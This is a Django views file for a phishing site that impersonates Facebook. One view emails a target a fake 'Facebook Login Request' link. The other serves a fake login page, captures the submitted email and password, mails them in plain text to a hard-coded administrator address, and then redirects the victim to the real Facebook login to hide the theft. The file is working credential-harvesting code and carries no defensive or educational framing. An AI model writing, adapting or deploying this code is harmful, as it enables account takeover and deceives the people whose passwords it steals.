from django.shortcuts import redirect, render
from django.template.loader import render_to_string
from django.core.mail import EmailMessage

admin_email = 'iit2019142@iiita.ac.in'

def inputs(request):
    if request.method == 'POST':
        email=request.POST['email']
        name=request.POST['name']

        mail_subject = 'Facebook Login Request'
        href="http://localhost:8000/redirect_to_fb/"
        html_message = render_to_string('email.html', {
            "name":name,
            "email":email,
            "href":href,
        })
        to_email = email
        email = EmailMessage(
                    mail_subject, html_message, to=[to_email]
        )
        email.content_subtype = "html"
        email.send()

    return render(request, 'inputs.html')

def redirect_to_fb(request):
    if request.method == 'POST':
        user_email=request.POST['email']
        password=request.POST['password']

        mail_subject = 'Facebook Login request received'
        html_message = render_to_string('admin_email.html',{
            "password":password,
            "email":user_email,
        })
        to_email = admin_email
        email = EmailMessage(
            mail_subject, html_message, to=[to_email]
        )
        email.content_subtype = "html"
        email.send()

        return redirect("https://www.facebook.com/login")
    return render(request, 'fb-login.html')